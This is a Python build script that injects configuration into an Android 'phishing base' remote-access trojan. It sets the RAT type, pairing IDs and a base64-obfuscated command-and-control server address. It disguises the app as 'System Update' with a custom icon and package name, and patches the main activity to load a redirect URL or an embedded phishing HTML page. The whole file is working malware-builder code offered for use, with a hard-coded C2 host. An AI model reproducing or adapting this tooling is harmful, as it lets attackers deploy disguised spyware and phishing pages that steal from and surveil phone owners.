#!/usr/bin/env python3
"""Inject build config into Android phishing base. Safe XML / Kotlin patches."""
import os, re, base64, sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
ANDROID = os.path.join(ROOT, "android")
MANIFEST = os.path.join(ANDROID, "app/src/main/AndroidManifest.xml")
MAIN_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/MainActivity.kt")
DEVICE_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/DeviceService.kt")
STRINGS = os.path.join(ANDROID, "app/src/main/res/values/strings.xml")
APP_GRADLE = os.path.join(ANDROID, "app/build.gradle")

APP_NAME = (os.environ.get("APP_NAME") or "System Update").strip()
APP_ID = (os.environ.get("APP_ID") or "com.sync.xxx").strip()
RAT_TYPE = (os.environ.get("RAT_TYPE") or "ALL").strip().upper()
REDIRECT_MODE = (os.environ.get("REDIRECT_MODE") or "URL").strip().upper()
REDIRECT_VALUE = os.environ.get("REDIRECT_VALUE") or "https://example.com"
SERVER_URL = (os.environ.get("SERVER_URL") or "http://papsky.queen-official.com:2468").strip()
PAIR_ID = (os.environ.get("PAIR_ID") or "NEONXJZET0000").strip()
VERSION_NAME = (os.environ.get("VERSION_NAME") or "1.0").strip()
VERSION_CODE = (os.environ.get("VERSION_CODE") or "1").strip()
ICON_B64 = (os.environ.get("ICON_BASE64") or os.environ.get("ICON_B64") or "").strip()

print("[inject] APP_NAME=", APP_NAME)
print("[inject] APP_ID=", APP_ID)
print("[inject] RAT_TYPE=", RAT_TYPE)
print("[inject] REDIRECT_MODE=", REDIRECT_MODE)
print("[inject] SERVER_URL=", SERVER_URL)
print("[inject] PAIR_ID=", PAIR_ID)

# ── 1. uid.json pair ──────────────────────────────────────
uid_path = os.path.join(ANDROID, "app/src/main/assets/uid.json")
os.makedirs(os.path.dirname(uid_path), exist_ok=True)
with open(uid_path, "w") as f:
    f.write('{"uid":"%s","pair":"%s","auto":true}\n' % (PAIR_ID, PAIR_ID))
print("[inject] uid.json")

# ── 2. SERVER_URL in DeviceService ────────────────────────
if os.path.isfile(DEVICE_KT):
    with open(DEVICE_KT, "r", encoding="utf-8", errors="ignore") as f:
        dsrc = f.read()
    b64_server = base64.b64encode(SERVER_URL.encode()).decode()
    dsrc2, n = re.subn(
        r'(android\.util\.Base64\.decode\(\s*")[^"]+(")',
        r"\1%s\2" % b64_server,
        dsrc,
        count=1,
    )
    if n:
        with open(DEVICE_KT, "w", encoding="utf-8") as f:
            f.write(dsrc2)
        print("[inject] SERVER_URL patched")
    else:
        print("[warn] SERVER_URL pattern not found")

# ── 3. strings.xml app_name ───────────────────────────────
if os.path.isfile(STRINGS):
    with open(STRINGS, "r", encoding="utf-8", errors="ignore") as f:
        s = f.read()
    s2 = re.sub(
        r'(<string\s+name="app_name">)[^<]*(</string>)',
        r"\1%s\2" % APP_NAME.replace("&", "&amp;").replace("<", "&lt;"),
        s,
        count=1,
    )
    with open(STRINGS, "w", encoding="utf-8") as f:
        f.write(s2)
    print("[inject] strings app_name")

# ── 4. applicationId / version in build.gradle ────────────
if os.path.isfile(APP_GRADLE):
    with open(APP_GRADLE, "r", encoding="utf-8", errors="ignore") as f:
        g = f.read()
    g = re.sub(r'applicationId\s+"[^"]*"', 'applicationId "%s"' % APP_ID, g, count=1)
    g = re.sub(r"versionCode\s+\d+", "versionCode %s" % VERSION_CODE, g, count=1)
    g = re.sub(r'versionName\s+"[^"]*"', 'versionName "%s"' % VERSION_NAME, g, count=1)
    with open(APP_GRADLE, "w", encoding="utf-8") as f:
        f.write(g)
    print("[inject] build.gradle id/version")

# ── 5. Manifest: label only (do NOT rewrite permission blocks in ways that break XML) ──
if os.path.isfile(MANIFEST):
    with open(MANIFEST, "r", encoding="utf-8", errors="ignore") as f:
        man = f.read()
    # label on application
    man = re.sub(
        r'(<application\b[^>]*android:label=")[^"]*(")',
        r"\1%s\2" % APP_NAME.replace("&", "&amp;").replace('"', ""),
        man,
        count=1,
    )
    # package on manifest root if present
    man = re.sub(r'(package=")[^"]*(")', r"\1%s\2" % APP_ID, man, count=1)
    # namespace in manifest
    man = re.sub(
        r'(android:name="\.)(MainActivity")',
        r"\1\2",
        man,
    )
    with open(MANIFEST, "w", encoding="utf-8") as f:
        f.write(man)
    print("[inject] manifest label/package")
    # light permission trim for TWO: comment only INTERNET+FGS keep — skip heavy rewrite to avoid XML break
    if RAT_TYPE == "TWO":
        print("[inject] RAT TWO — keep existing manifest perms (safe mode)")
    else:
        print("[inject] RAT ALL — keep existing manifest perms")

# ── 6. MainActivity redirect ──────────────────────────────
if os.path.isfile(MAIN_KT):
    with open(MAIN_KT, "r", encoding="utf-8", errors="ignore") as f:
        msrc = f.read()

    if REDIRECT_MODE == "URL":
        url = REDIRECT_VALUE.strip()
        if not url.startswith("http"):
            url = "https://" + url
        url_esc = url.replace("\\", "\\\\").replace('"', '\\"')
        new_load = 'webView.loadUrl("%s")' % url_esc
        # replace first loadUrl or loadDataWithBaseURL call inside setup
        msrc2, n = re.subn(
            r"webView\.loadUrl\([^)]*\)",
            new_load,
            msrc,
            count=1,
        )
        if n == 0:
            msrc2, n = re.subn(
                r"webView\.loadDataWithBaseURL\([^)]*\)",
                new_load,
                msrc,
                count=1,
            )
        if n == 0:
            msrc2 = msrc.replace(
                "webView.webViewClient = WebViewClient()",
                "webView.webViewClient = WebViewClient()\n        " + new_load,
                1,
            )
            print("[inject] URL appended")
        else:
            print("[inject] URL replaced")
        msrc = msrc2
    else:
        raw = REDIRECT_VALUE.strip()
        try:
            if re.match(r"^[A-Za-z0-9+/=\s]+$", raw) and len(raw) > 80:
                decoded = base64.b64decode(raw).decode("utf-8", errors="ignore")
                if "<" in decoded:
                    raw = decoded
        except Exception:
            pass
        if "<html" not in raw.lower():
            raw = (
                "<!DOCTYPE html><html><head><meta charset=UTF-8>"
                '<meta name=viewport content="width=device-width,initial-scale=1">'
                "</head><body>%s</body></html>" % raw
            )
        html_b64 = base64.b64encode(raw.encode("utf-8")).decode("ascii")
        asset_path = os.path.join(ANDROID, "app/src/main/assets/phish.html.b64")
        os.makedirs(os.path.dirname(asset_path), exist_ok=True)
        with open(asset_path, "w") as af:
            af.write(html_b64)
        load_html = (
            "try {"
            ' val b64 = assets.open("phish.html.b64").bufferedReader().readText();'
            " val html = String(android.util.Base64.decode(b64, android.util.Base64.DEFAULT));"
            ' webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)'
            " } catch (e: Exception) {"
            ' webView.loadUrl("about:blank")'
            " }"
        )
        msrc2, n = re.subn(r"webView\.loadUrl\([^)]*\)", load_html, msrc, count=1)
        if n == 0:
            msrc2, n = re.subn(
                r"webView\.loadDataWithBaseURL\([^)]*\)", load_html, msrc, count=1
            )
        if n:
            msrc = msrc2
            print("[inject] HTML mode")
        else:
            print("[warn] no loadUrl/loadData to patch for HTML")

    with open(MAIN_KT, "w", encoding="utf-8") as f:
        f.write(msrc)

# ── 7. icon ───────────────────────────────────────────────
if ICON_B64:
    try:
        import io
        from pathlib import Path as P
        raw_b64 = ICON_B64.split(",", 1)[-1] if "," in ICON_B64 else ICON_B64
        data = base64.b64decode(raw_b64)
        try:
            from PIL import Image
            im = Image.open(io.BytesIO(data)).convert("RGBA")
            buf = io.BytesIO()
            im.save(buf, format="PNG")
            data = buf.getvalue()
        except Exception as e:
            print("[inject] pillow:", e)
        res = P(ANDROID) / "app" / "src" / "main" / "res"
        for dens, size in (
            ("mdpi", 48),
            ("hdpi", 72),
            ("xhdpi", 96),
            ("xxhdpi", 144),
            ("xxxhdpi", 192),
        ):
            d = res / ("mipmap-%s" % dens)
            d.mkdir(parents=True, exist_ok=True)
            try:
                from PIL import Image
                im = Image.open(io.BytesIO(data)).convert("RGBA")
                im = im.resize((size, size), Image.LANCZOS)
                outp = d / "ic_launcher.png"
                im.save(str(outp), format="PNG")
                (d / "ic_launcher_round.png").write_bytes(outp.read_bytes())
            except Exception:
                (d / "ic_launcher.png").write_bytes(data)
                (d / "ic_launcher_round.png").write_bytes(data)
        print("[inject] custom icon written")
    except Exception as e:
        print("[warn] icon:", e)
else:
    print("[inject] icon default")

print("[inject] done")
